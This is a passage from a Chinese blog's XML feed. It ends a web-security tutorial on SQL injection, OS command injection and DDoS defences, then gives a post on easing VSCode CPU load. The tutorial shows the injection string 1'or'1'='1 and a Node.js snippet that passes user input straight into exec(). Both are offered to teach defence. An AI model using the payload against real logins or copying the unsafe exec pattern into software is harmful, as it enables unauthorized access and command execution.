class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拼接后的SQL</span></span><br><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> test.user</span><br><span class="line"><span class="keyword">WHERE</span> username = <span class="string">&#x27;bird&#x27;</span></span><br><span class="line"><span class="keyword">AND</span> <span class="keyword">password</span> = <span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="攻击危害-1"><a href="#攻击危害-1" class="headerlink" title="攻击危害"></a>攻击危害</h3><ul><li>猜解后台数据库，盗取网站敏感信息</li><li>绕过验证登录网站后台</li><li>借助数据库的存储过程进行提权等操作</li></ul><h3 id="防范手段-3"><a href="#防范手段-3" class="headerlink" title="防范手段"></a>防范手段</h3><ul><li>严格限制 Web 应用的数据库的操作权限，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害</li><li>后端代码检查输入的数据是否符合预期，严格限制变量的类型，例如使用正则表达式进行一些匹配处理</li><li>对进入数据库的特殊字符（<code>&#39;、&quot;、\、&lt;、&gt;、&amp;、*、;</code> 等），或编码转换。基本上所有的后端语言都有对字符串进行转义处理的 方法，比如 lodash 的 <code>lodash._escapehtmlchar</code> </li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">async</span> (ctx) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; username, password &#125; = ctx.request.body</span><br><span class="line">    <span class="keyword">const</span> sql = <span class="string">`</span></span><br><span class="line"><span class="string">    SELECT *</span></span><br><span class="line"><span class="string">    FROM test.user</span></span><br><span class="line"><span class="string">    WHERE username = ?</span></span><br><span class="line"><span class="string">    AND password = ?</span></span><br><span class="line"><span class="string">    `</span></span><br><span class="line">    res = <span class="keyword">await</span> query(sql, [username, password])</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h2><h3 id="OS-命令注入"><a href="#OS-命令注入" class="headerlink" title="OS 命令注入"></a>OS 命令注入</h3><p>OS 命令注入和 SQL 注入差不多，只不过 SQL 注入是针对数据库的，而 OS 命令注入是针对操作系统的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以 Node.js 为例，假如在接⼝中需要从 github 下载⽤户指定的 repo</span></span><br><span class="line"><span class="keyword">const</span> exec = <span class="built_in">require</span>(<span class="string">&#x27;mz/child_process&#x27;</span>).exec;</span><br><span class="line"><span class="keyword">let</span> params = &#123;<span class="comment">/* ⽤户输⼊的参数 */</span>&#125;;</span><br><span class="line">exec(<span class="string">`git clone <span class="subst">$&#123;params.repo&#125;</span> /some/path`</span>);</span><br></pre></td></tr></table></figure><h3 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h3><p>distributed denial of service，DDOS 不是一种攻击，而是一大类攻击的总称。其中，比较常见的一种攻击是 cc 攻击。它就是简单粗暴地送来大量正常的请求，超出服务器的最大承受量，导致宕机</p><ul><li><p>SYN Flood</p><p>此攻击通过向目标发送具有可欺骗性源 IP 地址的大量 TCP “初始连接请求” SYN 数据包来利用 TCP 握手。目标机器响应每个连接请求，然后等待握手中的最后一步，这一步从未发生过，耗尽了进程中的目标资源</p></li><li><p>HTTP Flood</p><p>此攻击类似于同时在多个不同计算机上反复按 Web 浏览器中的刷新（大量 HTTP 请求泛滥服务器，导致拒绝服务）</p></li></ul><p><strong>防御手段</strong></p><ul><li>备份网站</li><li>HTTP 请求拦截 高防 IP</li><li>宽带扩容 + CDN</li></ul>]]></content>
    
    
    <summary type="html">XSS分类与防范、CSRF攻击流程与防范、SQL注入、点击劫持、DDOS等</summary>
    
    
    
    <category term="网络" scheme="http://llmysnow.top/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="XSS" scheme="http://llmysnow.top/tags/XSS/"/>
    
    <category term="CSRF" scheme="http://llmysnow.top/tags/CSRF/"/>
    
    <category term="网络安全" scheme="http://llmysnow.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>vscode造成电脑卡顿</title>
    <link href="http://llmysnow.top/posts/fc53734b/"/>
    <id>http://llmysnow.top/posts/fc53734b/</id>
    <published>2021-08-30T02:30:08.608Z</published>
    <updated>2021-08-30T02:30:08.608Z</updated>
    
    <content type="html"><![CDATA[<h3 id="主流解决方案"><a href="#主流解决方案" class="headerlink" title="主流解决方案"></a>主流解决方案</h3><p>最近使用 Vscode 总是特别卡顿，网上大部分的解决方案如下（但是没有什么效果）</p><ul><li>search.followSymlinksd: false （控制是否在搜索中跟踪符号链接）</li><li>git.enabled: false （是否启用Git）</li><li>git.autorefresh: false （是否启用自动刷新）</li></ul><a id="more"></a><h3 id="语言设置问题"><a href="#语言设置问题" class="headerlink" title="语言设置问题"></a>语言设置问题</h3><p>都设置后还是很卡，很是头疼。去查看一下资源管理器，看一下哪个占用较多的cpu资源，发现是一个 Microsoft.Python.LanguageServer 的进程占用</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/Basics/python%E5%8D%A0%E7%94%A8%E8%BF%87%E9%AB%98.png" alt="cpu-python"></p><p>勾选 Jedi 不使用 Microsoft</p><ul><li>Python: Language Server: jedi</li></ul><p><img data-src="https://gitee.com/lilyn/pic/raw/master/Basics/%E4%BF%AE%E6%94%B9python%E8%AF%AD%E8%A8%80.png" alt="修改python语言"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 最好在 settings.json 中加上这个，要不然可能随时变回 Microsoft</span></span><br><span class="line">&quot;python.languageServer&quot;: &quot;Jedi&quot;,</span><br></pre></td></tr></table></figure><p>同样， cpptools.exe 的进程占用也很高</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/Basics/C%E5%8D%A0%E7%94%A8%E8%BF%87%E9%AB%98.png" alt="cpu-c"></p><ul><li>C_Cpp: Intelli Sense Engine: disabled</li></ul><p><img data-src="https://gitee.com/lilyn/pic/raw/master/Basics/%E4%BF%AE%E6%94%B9c%E8%AF%AD%E8%A8%80.png" alt="修改c语言"></p><h3 id="插件问题"><a href="#插件问题" class="headerlink" title="插件问题"></a>插件问题</h3><p>都设置后，还是会时不时卡顿，再去查看资源管理器，发现有一些插件也会导致 CPU 过高</p><ul><li>Auto Rename Tag （其实按F2重构即可）</li></ul><p>你可以在命令面板（Ctrl + Shift + P）输入 <code>Developer: Startup Performance</code> 查看各个插件启动时间</p><p>可以参考 <a href="https://juejin.cn/post/6844904115798016008">那些你应该考虑卸载的 VSCode 扩展</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;主流解决方案&quot;&gt;&lt;a href=&quot;#主流解决方案&quot; class=&quot;headerlink&quot; title=&quot;主流解决方案&quot;&gt;&lt;/a&gt;主流解决方案&lt;/h3&gt;&lt;p&gt;最近使用 Vscode 总是特别卡顿，网上大部分的解决方案如下（但是没有什么效果）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;search.followSymlinksd: false （控制是否在搜索中跟踪符号链接）&lt;/li&gt;
&lt;li&gt;git.enabled: false （是否启用Git）&lt;/li&gt;
&lt;li&gt;git.autorefresh: false （是否启用自动刷新）&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="基础配置" scheme="http://llmysnow.top/categories/%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="问题" scheme="http://llmysnow.top/tags/%E9%97%AE%E9%A2%98/"/>
    
    <category term="Vscode" scheme="http://llmysnow.top/tags/Vscode/"/>
    
    <category term="电脑卡顿" scheme="http://llmysnow.top/tags/%E7%94%B5%E8%84%91%E5%8D%A1%E9%A1%BF/"/>
    
  </entry>
  
</feed>
